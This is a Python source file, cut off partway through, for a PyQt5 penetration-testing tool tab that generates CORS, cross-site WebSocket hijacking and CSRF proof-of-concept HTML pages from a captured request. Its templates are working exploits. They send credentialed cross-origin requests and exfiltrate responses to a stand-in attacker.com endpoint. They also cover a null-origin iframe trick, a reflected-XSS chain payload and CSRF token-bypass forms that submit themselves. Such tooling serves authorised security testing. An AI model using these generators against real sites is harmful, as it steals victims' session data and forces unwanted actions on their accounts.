"""
poc_tab.py  –  PoC Tab for CORS/CSRF Proof-of-Concept Generation
===============================================================
A tab similar to BypassTab, focused on generating and testing CORS and CSRF PoCs for a given HTTP request.

Layout (horizontal split):
  ┌──────────────────────────┬──────────────────────────────────────┐
  │  LEFT PANEL              │  RIGHT PANEL                         │
  │  ┌────────────────────┐  │  ┌──────────────────────────────┐   │
  │  │  HTTP Request      │  │  │  📄 Generated PoC             │   │
  │  │  (like Repeater)   │  │  │  ├── code editor             │   │
  │  └────────────────────┘  │  │  ├── copy / test buttons     │   │
  │  ┌────────────────────┐  │  └──────────────────────────────┘   │
  │  │  PoC Configuration │  │  ┌──────────────────────────────┐   │
  │  │  • PoC Type        │  │  │  📋 Request Info             │   │
  │  │  • CORS Options    │  │  └──────────────────────────────┘   │
  │  │  • Output Format   │  │                                      │
  │  └────────────────────┘  │                                      │
  └──────────────────────────┴──────────────────────────────────────┘
"""

from __future__ import annotations

import re
import json
import os
import ssl
import socket
import threading
import queue
import tempfile
import webbrowser
import urllib.parse
import urllib.request
import urllib.error
import logging
import secrets
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QSplitter, QGroupBox,
    QLabel, QLineEdit, QTextEdit, QPushButton, QComboBox,
    QTableWidget, QTableWidgetItem, QHeaderView, QTabWidget,
    QCheckBox, QFrame, QApplication, QMenu, QMessageBox,
    QSizePolicy, QSpinBox, QFileDialog, QDialog, QProgressBar,
    QDialogButtonBox, QScrollArea, QFormLayout
)
from PyQt5.QtCore import Qt, pyqtSignal, QTimer, QThread, pyqtSlot
from PyQt5.QtGui import QColor, QBrush, QFont, QTextCursor

from modules.constants import (
    COLOR_ELEVATED_BG, COLOR_TEXT, COLOR_TEXT_BRIGHT, COLOR_BORDER,
    COLOR_ACCENT, COLOR_SUCCESS, COLOR_HIGH, COLOR_CRITICAL,
    COLOR_TEXT_MUTED, COLOR_DARK_BG, COLOR_CARD_BG,
    FONT_SIZE_NORMAL, HttpSyntaxHighlighter,
)

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Data containers
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class RequestInfo:
    """Stores parsed request information."""
    method: str = "GET"
    url: str = ""
    path: str = "/"
    host: str = ""
    scheme: str = "https"
    port: int = 443
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    params: Dict[str, List[str]] = field(default_factory=dict)
    cookies: Dict[str, str] = field(default_factory=dict)


# ─────────────────────────────────────────────────────────────────────────────
# Request parser (inlined from scanner_tab)
# ─────────────────────────────────────────────────────────────────────────────

def _parse_raw_request(raw: str) -> Dict[str, Any]:
    """Parse raw HTTP request into components."""
    lines = raw.replace("\r\n", "\n").split("\n")
    result: Dict[str, Any] = {
        "method": "GET", "path": "/", "http_version": "HTTP/1.1",
        "headers": {}, "body": "", "host": "",
    }
    if not lines:
        return result
    parts = lines[0].strip().split()
    if len(parts) >= 2:
        result["method"] = parts[0].upper()
        result["path"] = parts[1]
    i = 1
    while i < len(lines) and lines[i].strip():
        if ":" in lines[i]:
            k, v = lines[i].split(":", 1)
            result["headers"][k.strip()] = v.strip()
            if k.strip().lower() == "host":
                result["host"] = v.strip()
        i += 1
    if i < len(lines):
        result["body"] = "\n".join(lines[i + 1:]).strip()
    return result


def _build_request_info(raw_request: str, ui_host: str = "", ui_scheme: str = "https") -> RequestInfo:
    """Build a RequestInfo object from raw HTTP request with UI overrides."""
    parsed = _parse_raw_request(raw_request)
    
    # Use UI overrides if provided
    host = ui_host if ui_host else parsed.get("host", "")
    scheme = ui_scheme
    
    # Detect port from host if present
    port = 443 if scheme == "https" else 80
    if ":" in host:
        host, port_str = host.split(":", 1)
        try:
            port = int(port_str)
        except ValueError:
            pass
    
    # Build path
    path = parsed.get("path", "/")
    
    # Build full URL
    if path.startswith(("http://", "https://")):
        full_url = path
        # Extract host (and port) from URL if needed
        url_match = re.match(r'(https?://[^/]+)', path)
        if url_match and not host:
            url_host = url_match.group(1)
            host = url_host.replace("http://", "").replace("https://", "")
            if ":" in host:
                host, url_port_str = host.split(":", 1)
                try:
                    port = int(url_port_str)
                except ValueError:
                    pass
    else:
        full_url = f"{scheme}://{host}{path}" if host else path
    
    # Parse query parameters
    params = {}
    if "?" in path:
        query_part = path.split("?", 1)[1]
        params = urllib.parse.parse_qs(query_part)
    
    return RequestInfo(
        method=parsed.get("method", "GET"),
        url=full_url,
        path=path,
        host=host,
        scheme=scheme,
        port=port,
        headers=parsed.get("headers", {}),
        body=parsed.get("body", ""),
        params=params,
        cookies={}
    )


# ─────────────────────────────────────────────────────────────────────────────
# CORS Exploit Generator
# ─────────────────────────────────────────────────────────────────────────────

class CORSExploitGenerator:
    """Generates CORS exploitation PoCs for different misconfiguration types."""
    
    @staticmethod
    def generate_origin_reflection_poc(request_info: RequestInfo, attacker_server: str = "https://attacker.com") -> str:
        """Generate simple origin reflection PoC using XMLHttpRequest."""
        url = request_info.url
        method = request_info.method.lower()
        body = request_info.body
        
        # Prepare body for POST requests
        body_js = ""
        if method in ("post", "put", "patch") and body:
            escaped_body = body.replace("'", "\\'").replace("\n", "\\n")
            body_js = f"""
        var data = '{escaped_body}';
        req.send(data);"""
        else:
            body_js = """
        req.send();"""
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - Origin Reflection</title>
</head>
<body>
    <h3>CORS Origin Reflection Proof of Concept</h3>
    <p>Target: <code>{url}</code></p>
    <p>Attacker Server: <code>{attacker_server}</code></p>
    <p>This page attempts to steal data from the target. If the server reflects the Origin header 
    in Access-Control-Allow-Origin, the data will be stolen and sent to your server.</p>
    
    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('{method}', '{url}', true);
        req.withCredentials = true;{body_js}
        
        function reqListener() {{
            console.log('Response received:', this.responseText);
            // Send stolen data to attacker server
            location = '{attacker_server}/log?key=' + encodeURIComponent(this.responseText);
        }}
        
        console.log('CORS PoC loaded');
        console.log('Target: {url}');
        console.log('Will send stolen data to: {attacker_server}');
    </script>
    
    <p>Check your browser console for response data.</p>
    <p>To receive stolen data, set up a server at <code>{attacker_server}/log</code> to capture the data.</p>
</body>
</html>'''
    
    @staticmethod
    def generate_null_origin_poc(request_info: RequestInfo, attacker_server: str = "https://attacker.com") -> str:
        """Generate null origin bypass PoC using sandboxed iframe.

        Uses a data:text/html src with an inline <script> — exactly the
        pattern that triggers Origin: null in all major browsers.  This PoC
        must be served over HTTP/HTTPS (not opened as a local file) to work.
        """
        url = request_info.url
        method = request_info.method.lower()
        body = request_info.body

        # Build srcdoc content for the iframe (avoids data: URI blocked by Chrome 97+, Firefox).
        _js_esc = lambda s: s.replace('"', '&quot;')
        if method in ("post", "put", "patch") and body:
            _send = 'req.send("' + _js_esc(body) + '");'
        else:
            _send = 'req.send();'
        _script = (
            'var req=new XMLHttpRequest();'
            'req.onload=function(){'
            'location="' + _js_esc(attacker_server) + '/log?key="'
            '+encodeURIComponent(this.responseText);}; '
            'req.open("' + method + '","' + _js_esc(url) + '",true);'
            'req.withCredentials=true;'
            + _send
        )
        _srcdoc = (
            '<!DOCTYPE html><html><body><script>'
            + _script + '</script></body></html>'
        ).replace("'", '&#39;')

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - null Origin Bypass</title>
</head>
<body>
    <h3>CORS null Origin Bypass Proof of Concept</h3>
    <p>Target: <code>{url}</code></p>
    <p>Attacker Server: <code>{attacker_server}</code></p>
    <p>This page uses a sandboxed iframe to send a request with <code>Origin: null</code>.</p>
    <p>If the server whitelists the null origin, data will be stolen.</p>
    <p><strong>Note:</strong> Host this file on an HTTP/HTTPS server — it will not work when opened as a local file.</p>

    <iframe sandbox="allow-scripts allow-top-navigation allow-forms"
            srcdoc='{_srcdoc}'
            style="display:none"></iframe>

    <p>To receive stolen data, set up a listener at <code>{attacker_server}/log</code>.</p>
</body>
</html>'''

    @staticmethod
    def generate_trusted_subdomain_poc(
        request_info: RequestInfo,
        attacker_server: str = "https://attacker.com",
        xss_mode: bool = False,
        xss_url: str = "",
        xss_param: str = "",
    ) -> str:
        """Generate PoC for trusted-subdomain CORS misconfiguration.

        Two modes:
          • Normal  – host this page on any subdomain you control.
          • XSS     – the subdomain has a reflected XSS vulnerability.
                      A document.location redirect carries the XSS payload
                      inside the vulnerable parameter, which then fires the
                      CORS request from the subdomain's origin.
        """
        url = request_info.url
        method = request_info.method.lower()
        host = request_info.host or "example.com"
        body = request_info.body

        if method in ("post", "put", "patch") and body:
            escaped_body = body.replace("'", "\\'").replace("\n", "\\n")
            send_line = f"req.send('{escaped_body}');"
        else:
            send_line = "req.send();"

        # ── XSS chain mode ──────────────────────────────────────────────────
        if xss_mode and xss_url and xss_param:
            # Build the inner XSS payload — this is injected into the parameter
            # value and runs inside the vulnerable subdomain's origin, so the
            # resulting CORS request carries that subdomain as its Origin.
            xss_payload = (
                f"<script>"
                f"var req = new XMLHttpRequest(); "
                f"req.onload = reqListener; "
                f"req.open('{method}','{url}',true); "
                f"req.withCredentials = true;"
                f"{send_line}"
                f"function reqListener() {{"
                f"location='{attacker_server}/log?key='%2bthis.responseText; "
                f"}};"
                f"%3c/script>"
            )

            # Inject payload into the vulnerable parameter inside the XSS URL.
            # Parse the URL, replace the target param value, rebuild.
            parsed_xss = urllib.parse.urlparse(xss_url)
            qs = urllib.parse.parse_qs(parsed_xss.query, keep_blank_values=True)
            if xss_param in qs:
                original_val = qs[xss_param][0]
                qs[xss_param] = [original_val + xss_payload]
            else:
                qs[xss_param] = [xss_payload]

            # Rebuild query string — do NOT double-encode the payload chars
            new_qs_parts = []
            for k, vals in qs.items():
                for v in vals:
                    if k == xss_param:
                        # Keep the payload raw (already contains %2b / %3c etc.)
                        new_qs_parts.append(f"{urllib.parse.quote(k, safe='')}={v}")
                    else:
                        new_qs_parts.append(
                            f"{urllib.parse.quote(k, safe='')}={urllib.parse.quote(v, safe='')}"
                        )
            new_query = "&".join(new_qs_parts)
            exploit_url = urllib.parse.urlunparse(parsed_xss._replace(query=new_query))

            return f'''<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - Trusted Subdomain (XSS Chain)</title>
</head>
<body>
    <h3>CORS Trusted-Subdomain + Reflected XSS Chain Proof of Concept</h3>
    <p>Main target (CORS endpoint): <code>{url}</code></p>
    <p>XSS entry point: <code>{xss_url}</code></p>
    <p>Vulnerable parameter: <code>{xss_param}</code></p>
    <p>Attacker Server: <code>{attacker_server}</code></p>
    <p>
        The victim is redirected to the XSS URL on the trusted subdomain.
        The reflected XSS payload fires an XHR <em>from that subdomain's origin</em>,
        which the main server accepts via its <code>*.{host}</code> CORS policy.
        Stolen data is then exfiltrated to the attacker server.
    </p>

    <script>
        document.location = "{exploit_url}";
    </script>

    <p>To receive stolen data, set up a listener at <code>{attacker_server}/log</code>.</p>
</body>
</html>'''

        # ── Normal mode (host on a subdomain you control) ────────────────────
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - Trusted Subdomain</title>
</head>
<body>
    <h3>CORS Trusted-Subdomain Misconfiguration Proof of Concept</h3>
    <p>Target: <code>{url}</code></p>
    <p>Assumed trusted origin: <code>https://attacker.{host}</code></p>
    <p>Attacker Server: <code>{attacker_server}</code></p>
    <p>
        This PoC works when the server allows any <code>*.{host}</code> origin.
        Host this page on a subdomain you control (e.g.
        <code>attacker.{host}</code>), or use the XSS chain option if a
        subdomain has a reflected XSS vulnerability.
    </p>

    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('{method}', '{url}', true);
        req.withCredentials = true;
        {send_line}

        function reqListener() {{
            console.log('Response received:', this.responseText);
            location = '{attacker_server}/log?key=' + encodeURIComponent(this.responseText);
        }}

        console.log('CORS Trusted-Subdomain PoC loaded');
        console.log('Target: {url}');
        console.log('Trusted subdomain pattern: *.{host}');
        console.log('Will send stolen data to: {attacker_server}');
    </script>

    <p>Check your browser console for response data.</p>
    <p>To receive stolen data, set up a listener at <code>{attacker_server}/log</code>.</p>
</body>
</html>'''

    @staticmethod
    def generate_wildcard_misconfig_poc(request_info: RequestInfo, attacker_server: str = "https://attacker.com") -> str:
        """Generate PoC for wildcard (*) CORS misconfiguration.

        When a server returns Access-Control-Allow-Origin: * the browser does
        NOT send cookies even with withCredentials=true, so this PoC targets
        unauthenticated endpoints or bearer-token APIs where credentials are
        in request headers rather than cookies.
        """
        url = request_info.url
        method = request_info.method.lower()
        body = request_info.body

        # Collect interesting headers to forward (excluding hop-by-hop)
        _skip = {"host", "content-length", "transfer-encoding", "connection"}
        header_lines = "\n".join(
            f'        req.setRequestHeader("{k}", "{v}");'
            for k, v in request_info.headers.items()
            if k.lower() not in _skip
        )

        body_js = ""
        if method in ("post", "put", "patch") and body:
            escaped_body = body.replace("'", "\\'").replace("\n", "\\n")
            body_js = f"\n        req.send('{escaped_body}');"
        else:
            body_js = "\n        req.send();"

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - Wildcard Misconfiguration</title>
</head>
<body>
    <h3>CORS Wildcard (*) Misconfiguration Proof of Concept</h3>
    <p>Target: <code>{url}</code></p>
    <p>Attacker Server: <code>{attacker_server}</code></p>
    <p>
        The server returns <code>Access-Control-Allow-Origin: *</code>.
        Credentials (cookies) cannot be sent with wildcard origins, but
        this PoC forwards authorization headers (e.g. Bearer tokens) to
        demonstrate data exfiltration from unauthenticated or token-authed endpoints.
    </p>

    <script>
        var req = new XMLHttpRequest();
        req.onload = function() {{
            console.log('Response received:', this.responseText);
            fetch('{attacker_server}/log?key=' + encodeURIComponent(this.responseText), {{
                mode: 'no-cors'
            }});
        }};
        req.open('{method}', '{url}', true);
        // NOTE: withCredentials is intentionally false for wildcard CORS
{header_lines}{body_js}

        console.log('CORS Wildcard PoC loaded');
        console.log('Target: {url}');
    </script>

    <p>Check your browser console for response data.</p>
    <p>To receive stolen data, set up a listener at <code>{attacker_server}/log</code>.</p>
</body>
</html>'''


# ─────────────────────────────────────────────────────────────────────────────
# CSWSH (Cross-Site WebSocket Hijacking) PoC Generator
# ─────────────────────────────────────────────────────────────────────────────

class CSWSHGenerator:
    """Generates Cross-Site WebSocket Hijacking (CSWSH) PoC HTML pages.

    Reference: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

    The victim browser:
      1. Opens the attacker page.
      2. The page opens a WebSocket to the target endpoint.
      3. The browser automatically attaches session cookies to the WS handshake.
      4. The server accepts the authenticated WS connection cross-origin.
      5. Messages returned by the server are exfiltrated to the attacker server.
    """

    @staticmethod
    def _derive_ws_url(request_info: "RequestInfo") -> str:
        """Convert an HTTP RequestInfo into a ws:// / wss:// URL."""
        path = request_info.path or "/"
        # Already a WS URL (e.g. pasted directly)
        if path.startswith(("ws://", "wss://")):
            return path
        scheme = "wss" if request_info.scheme in ("https", "wss") else "ws"
        host   = request_info.host or ""
        port   = request_info.port
        default_port = 443 if scheme == "wss" else 80
        host_part = f"{host}:{port}" if port and port != default_port else host
        return f"{scheme}://{host_part}{path}" if host_part else ""

    @staticmethod
    def generate(
        request_info:    "RequestInfo",
        ws_url:          str = "",
        messages:        Optional[List[str]] = None,
        attacker_server: str = "https://attacker.com",
        reconnect:       bool = False,
    ) -> str:
        """Generate a CSWSH PoC HTML page (PortSwigger-style clean script)."""
        url = ws_url.strip() or CSWSHGenerator._derive_ws_url(request_info)
        if not url:
            url = "wss://TARGET/websocket-endpoint"

        msgs = [m for m in (messages or []) if m.strip()]

        # ws.onopen — send each configured message
        if msgs:
            send_lines = "\n".join(f"        ws.send({json.dumps(m)});" for m in msgs)
            on_open_body = send_lines
        else:
            on_open_body = "        // no messages configured"

        # ws.onclose — reconnect or nothing
        on_close_block = ""
        if reconnect:
            on_close_block = (
                "\n    ws.onclose = function() {\n"
                "        setTimeout(connect, 3000);\n"
                "    };"
            )

        # Wrap in a named function only when reconnect is needed
        if reconnect:
            script_body = (
                f"    function connect() {{\n"
                f"        var ws = new WebSocket('{url}');\n"
                f"        ws.onopen = function() {{\n"
                f"{on_open_body}\n"
                f"        }};\n"
                f"        ws.onmessage = function(event) {{\n"
                f"            fetch('{attacker_server}', {{method: 'POST', mode: 'no-cors', body: event.data}});\n"
                f"        }};\n"
                f"        ws.onclose = function() {{\n"
                f"            setTimeout(connect, 3000);\n"
                f"        }};\n"
                f"    }}\n"
                f"    connect();"
            )
        else:
            script_body = (
                f"    var ws = new WebSocket('{url}');\n"
                f"    ws.onopen = function() {{\n"
                f"{on_open_body}\n"
                f"    }};\n"
                f"    ws.onmessage = function(event) {{\n"
                f"        fetch('{attacker_server}', {{method: 'POST', mode: 'no-cors', body: event.data}});\n"
                f"    }};"
            )

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSWSH PoC</title>
</head>
<body>
    <script>
{script_body}
    </script>
</body>
</html>'''


# ─────────────────────────────────────────────────────────────────────────────
# CSRF Generator
# ─────────────────────────────────────────────────────────────────────────────

class CSRFGenerator:
    """Generates CSRF proof-of-concept code."""
    
    # Constant: all recognised bypass technique keys
    BYPASS_REQUEST_METHOD          = "Token validation – Request method"
    BYPASS_HEAD_METHOD             = "Token validation – HEAD method (processed as GET)"
    BYPASS_TOKEN_ABSENT            = "Token validation – Token absent"
    BYPASS_NOT_TIED_TO_SESSION     = "Token validation – Not tied to session"
    BYPASS_REFERER_ABSENT          = "Referer header – Absent (meta tag)"
    BYPASS_TOKEN_VERIFIED_BY_COOKIE = "Token validation – Token is verified by a cookie"
    BYPASS_CONTENT_TYPE             = "Content-Type change"
    BYPASS_CT_PLAIN_JSON            = "text/plain – JSON body (no preflight)"
    BYPASS_CT_FORM_JSON             = "text/plain – JSON via form trick (no JS needed)"
    BYPASS_TOKEN_EMPTY              = "Token validation – Token empty value (csrf=)"
    BYPASS_METHOD_OVERRIDE_DELETE   = "Method override – POST + _method=DELETE"
    BYPASS_METHOD_OVERRIDE_PUT      = "Method override – POST + _method=PUT"
    BYPASS_METHOD_OVERRIDE_PATCH    = "Method override – POST + _method=PATCH"
    BYPASS_CUSTOM_HEADER_ABSENT     = "Custom header token – Header absent"
    # Convenience frozenset for checking any method-override bypass
    _METHOD_OVERRIDES = frozenset([
        "Method override \u2013 POST + _method=DELETE",
        "Method override \u2013 POST + _method=PUT",
        "Method override \u2013 POST + _method=PATCH",
    ])

    @staticmethod
    def _bypass_note(bypass: str, request_info: RequestInfo) -> str:
        """Return an HTML note describing the active bypass, or empty string."""
        if bypass == CSRFGenerator.BYPASS_REQUEST_METHOD and request_info.method == "POST":
            return ('<p><strong>Bypass:</strong> Request method switched POST → GET '
                    '(token validation skipped on GET).</p>')
        if bypass == CSRFGenerator.BYPASS_HEAD_METHOD:
            return ('<p><strong>Bypass:</strong> HEAD method sent instead of GET. '
                    'Many frameworks (e.g. Oak, Express) route HEAD to the GET handler '
                    'but strip the response body — the server-side action still executes '
                    'while any GET-based rate-limit or validation may be bypassed.</p>')
        if bypass == CSRFGenerator.BYPASS_TOKEN_ABSENT:
            return ('<p><strong>Bypass:</strong> CSRF token parameter removed entirely '
                    '(server skips validation when token is absent).</p>')
        if bypass == CSRFGenerator.BYPASS_NOT_TIED_TO_SESSION:
            return ('<p><strong>Bypass:</strong> CSRF token is not tied to the user session '
                    '(global token pool). The attacker\'s own valid token is accepted for any '
                    'victim\'s session.</p>')
        if bypass == CSRFGenerator.BYPASS_REFERER_ABSENT:
            return ('<p><strong>Bypass:</strong> Referer header suppressed via '
                    '<code>&lt;meta name="referrer" content="never"&gt;</code>. '
                    'The browser will omit the Referer header; applications that only '
                    'validate it when present will skip their CSRF check entirely.</p>')
        if bypass == CSRFGenerator.BYPASS_CONTENT_TYPE:
            return ('<p><strong>Bypass:</strong> Content-Type changed to '
                    '<code>text/plain</code> — a simple content type that does not '
                    'trigger a CORS preflight. The form uses <code>enctype="text/plain"</code> '
                    'so the browser includes the victim\'s session cookies in the '
                    'cross-origin submission.</p>')
        if bypass == CSRFGenerator.BYPASS_TOKEN_EMPTY:
            return ('<p><strong>Bypass:</strong> CSRF token parameter kept but set to an '
                    '<strong>empty string</strong> (csrf=). Some applications check that '
                    'the parameter is present but skip validating its value.</p>')
        if bypass in CSRFGenerator._METHOD_OVERRIDES:
            _m = ("DELETE" if bypass == CSRFGenerator.BYPASS_METHOD_OVERRIDE_DELETE
                  else "PUT" if bypass == CSRFGenerator.BYPASS_METHOD_OVERRIDE_PUT
                  else "PATCH")
            return (f'<p><strong>Bypass:</strong> Request sent as POST with '
                    f'<code>_method={_m}</code> in the body. Frameworks that support '
                    f'method overriding (Laravel, Symfony, Rails, Express) route this '
                    f'to the {_m} handler, which may skip CSRF validation.</p>')
        if bypass == CSRFGenerator.BYPASS_CUSTOM_HEADER_ABSENT:
            return ('<p><strong>Bypass:</strong> Custom CSRF header omitted. '
                    'Cross-origin HTML forms cannot set custom headers — the browser '
                    'blocks them. If the server relies solely on a custom header for '
                    'CSRF protection and accepts requests without it, it is vulnerable.</p>')
        return ""

    @staticmethod
    def _is_csrf_token_key(key: str) -> bool:
        """Return True if the param/cookie/header name looks like a CSRF token."""
        _TOKEN_RE = re.compile(
            r'^(?:csrf(?:[_\-]?(?:token|key|secret|nonce|hash|val|value))?'
            r'|csrfkey|csrf[-_]key'           # csrfKey, csrf_key, csrf-key
            r'|_csrf(?:[_\-]?token)?'
            r'|csrfmiddlewaretoken'
            r'|__requestverificationtoken'
            r'|authenticity_token'
            r'|xsrf(?:[_\-]?token)?'
            r'|_?token'
            r')$',
            re.IGNORECASE,
        )
        return bool(_TOKEN_RE.match(key.strip()))

    @staticmethod
    def _strip_csrf_token(body: str) -> str:
        """Remove CSRF token parameter(s) from a URL-encoded body string."""
        try:
            params = urllib.parse.parse_qsl(body, keep_blank_values=True)
            cleaned = [(k, v) for k, v in params if not CSRFGenerator._is_csrf_token_key(k)]
            return urllib.parse.urlencode(cleaned)
        except Exception:
            return body

    @staticmethod
    def _strip_csrf_token_json(data: dict) -> dict:
        """Remove CSRF token keys from a parsed JSON body dict."""
        return {k: v for k, v in data.items() if not CSRFGenerator._is_csrf_token_key(k)}

    @staticmethod
    def _empty_csrf_token(body: str) -> str:
        """Set CSRF token parameter(s) to empty string in a URL-encoded body."""
        try:
            params = urllib.parse.parse_qsl(body, keep_blank_values=True)
            modified = [(k, "" if CSRFGenerator._is_csrf_token_key(k) else v)
                        for k, v in params]
            return urllib.parse.urlencode(modified)
        except Exception:
            return body

    @staticmethod
    def _empty_csrf_token_json(data: dict) -> dict:
        """Set CSRF token values to empty string in a parsed JSON body dict."""
        return {k: ("" if CSRFGenerator._is_csrf_token_key(k) else v)
                for k, v in data.items()}

    @staticmethod
    def _body_to_query_params(url: str, body: str) -> str:
        """Merge POST body params into the URL query string (for GET method bypass)."""
        parsed = urllib.parse.urlparse(url)
        existing_qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        # Try JSON body
        try:
            body_data = json.loads(body)
            if isinstance(body_data, dict):
                for k, v in body_data.items():
                    existing_qs.setdefault(k, []).append(str(v))
        except (json.JSONDecodeError, ValueError):
            # Try URL-encoded body
            try:
                for k, vs in urllib.parse.parse_qs(body, keep_blank_values=True).items():
                    existing_qs.setdefault(k, []).extend(vs)
            except Exception:
                pass  # Raw body we can't parse — ignore

        new_query = urllib.parse.urlencode(existing_qs, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    @staticmethod
    def generate_csrf_form_poc(request_info: RequestInfo, auto_submit: bool = False,
                               new_tab: bool = True, attacker_server: str = "https://attacker.com",
                               bypass: str = "None", **kwargs) -> str:
        """Generate CSRF PoC using HTML form."""
        if bypass == CSRFGenerator.BYPASS_NOT_TIED_TO_SESSION:
            return CSRFGenerator.generate_csrf_not_tied_to_session_poc(
                request_info, attacker_server, auto_submit=auto_submit, **kwargs)

        if bypass == CSRFGenerator.BYPASS_TOKEN_VERIFIED_BY_COOKIE:
            method, url, body = CSRFGenerator._apply_bypass(request_info, bypass)
            bypass_note = CSRFGenerator._bypass_note(bypass, request_info)
            hidden_inputs = CSRFGenerator._hidden_inputs_from_body(body)
            target_attr = 'target="_blank"' if new_tab else ''
            img_src = kwargs.get("inject_url", "") or "COOKIE_INJECTION_URL_HERE"
            return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC – Token Verified by Cookie</title>
</head>
<body>
    <h3>CSRF Proof of Concept – Token Verified by Cookie</h3>
    {bypass_note}
    <p>Target: <code>{url}</code></p>
    <p>
        The CSRF token is validated by comparing it to a non-session cookie.<br>
        The <code>&lt;img&gt;</code> silently loads the cookie-injection URL to plant
        your known token value as a cookie in the victim&apos;s browser; once the
        request completes (or errors), the form is submitted with the matching token
        in the body, bypassing CSRF validation.
    </p>

    <form action="{url}" method="POST" id="csrf_form" {target_attr}>
{hidden_inputs}
        <input type="submit" value="Submit CSRF Request">
    </form>

    <img
      src="{img_src}"
      onerror="document.forms[0].submit();" />

    <script>
        console.log("CSRF bypass PoC loaded – Token Verified by Cookie technique");
        console.log("Cookie injection URL: {img_src}");
        console.log("Target URL: {url}");
    </script>
</body>
</html>'''

        method, url, body = CSRFGenerator._apply_bypass(request_info, bypass)
        bypass_note = CSRFGenerator._bypass_note(bypass, request_info)
        target_attr = 'target="_blank"' if new_tab else ''
        auto_submit_script = (
            '\n    <script>\n        document.getElementById("csrf_form").submit();\n    </script>'
            if auto_submit else ""
        )

        # ── Bypass: Request method – render as GET form ────────────────────
        if bypass == CSRFGenerator.BYPASS_REQUEST_METHOD and request_info.method == "POST":
            parsed_get = urllib.parse.urlparse(url)
            base_url   = urllib.parse.urlunparse(parsed_get._replace(query=""))
            get_params = urllib.parse.parse_qs(parsed_get.query, keep_blank_values=True)
            get_inputs = ""
            for k, vs in get_params.items():
                for v in vs:
                    ev = v.replace('"', '&quot;').replace('<', '&lt;').replace('>', '&gt;')
                    get_inputs += f'        <input type="hidden" name="{k}" value="{ev}">\n'

            return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC – Token Bypass: Request Method</title>
</head>
<body>
    {bypass_note}
    <p>Original method: <code>POST</code> → switched to <code>GET</code></p>
    <p>Target: <code>{base_url}</code></p>
    <p>
        The application validates the CSRF token only on POST requests.
        By switching to GET and moving all parameters into the query string,
        token validation is skipped entirely.
    </p>

    <form action="{base_url}" method="GET" id="csrf_form" {target_attr}>
{get_inputs}
        <input type="submit" value="Submit CSRF Request (GET bypass)">
    </form>

    <script>
        console.log("CSRF bypass PoC loaded – Request Method technique");
        console.log("GET target:", "{base_url}");
    </script>{auto_submit_script}
</body>
</html>'''

        # ── GET request (standard or after bypass) ─────────────────────────
        if method == "GET":
            return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - GET Request</title>
</head>
<body>
    <h3>CSRF Proof of Concept (GET)</h3>
    {bypass_note}
    <p>Target: <code>{url}</code></p>
    <p>
        The hidden <code>&lt;img&gt;</code> tag fires a credentialed GET request
        (the browser sends the victim&#39;s session cookies automatically).
    </p>
    <p>
        <strong>Note:</strong> Due to the Same-Origin Policy, the response body
        is not readable from a cross-origin page.  This PoC triggers the GET
        state-change action — data exfiltration additionally requires a CORS
        misconfiguration on the target server.
    </p>

    <img src="{url}" style="display:none"
         onload="console.log('CSRF GET request fired – target: {url}');"
         onerror="console.log('CSRF GET request fired (error response) – target: {url}');">

    <script>
        console.log('CSRF GET PoC loaded');
        console.log('Target URL: {url}');
    </script>
</body>
</html>'''

        # ── Bypass: Content-Type — POST form with enctype="text/plain" ──────
        if bypass == CSRFGenerator.BYPASS_CONTENT_TYPE:
            hidden_inputs = CSRFGenerator._hidden_inputs_from_body(body)
            return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC \u2013 Content-Type Bypass</title>
</head>
<body>
    <h3>CSRF Proof of Concept \u2013 Content-Type Bypass</h3>
    {bypass_note}
    <p>Target: <code>{url}</code></p>
    <p>
        The form uses <code>enctype="text/plain"</code> \u2014 a CORS <em>simple</em>
        content type that does not trigger an OPTIONS preflight.  The browser
        sends the victim&#39;s session cookies automatically.  Servers that only
        validate CSRF tokens when <code>Content-Type</code> is
        <code>application/json</code> or <code>application/x-www-form-urlencoded</code>
        will skip their check entirely.
    </p>

    <form action="{url}" method="POST" enctype="text/plain" id="csrf_form" {target_attr}>
{hidden_inputs}
        <input type="submit" value="Submit CSRF Request (text/plain)">
    </form>

    <script>
        console.log("CSRF bypass PoC loaded \u2013 Content-Type: text/plain technique");
        console.log("Target URL: {url}");
    </script>{auto_submit_script}
</body>
</html>'''

        # ── POST (standard or token-absent bypass) ─────────────────────────
        # body has already been cleaned by _apply_bypass if bypass is TOKEN_ABSENT
        hidden_inputs = CSRFGenerator._hidden_inputs_from_body(body)

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - POST Request</title>
</head>
<body>
    <h3>CSRF Proof of Concept (POST)</h3>
    {bypass_note}
    <p>Target: <code>{url}</code></p>
    <p>Attacker Server: <code>{attacker_server}</code></p>
    <p>This form will submit a POST request to the target. If no CSRF token is present, the action will execute.</p>

    <form action="{url}" method="POST" id="csrf_form" {target_attr}>
{hidden_inputs}
        <input type="submit" value="Submit CSRF Request">
    </form>

    <script>
        console.log("CSRF PoC loaded");
        console.log("Target URL: {url}");
        console.log("Method: POST");
    </script>{auto_submit_script}
</body>
</html>'''
    
    @staticmethod
    def generate_csrf_fetch_poc(request_info: RequestInfo, attacker_server: str = "https://attacker.com",
                                bypass: str = "None", **kwargs) -> str:
        """Generate CSRF PoC using fetch() API."""
        if bypass == CSRFGenerator.BYPASS_NOT_TIED_TO_SESSION:
            return CSRFGenerator.generate_csrf_not_tied_to_session_poc(
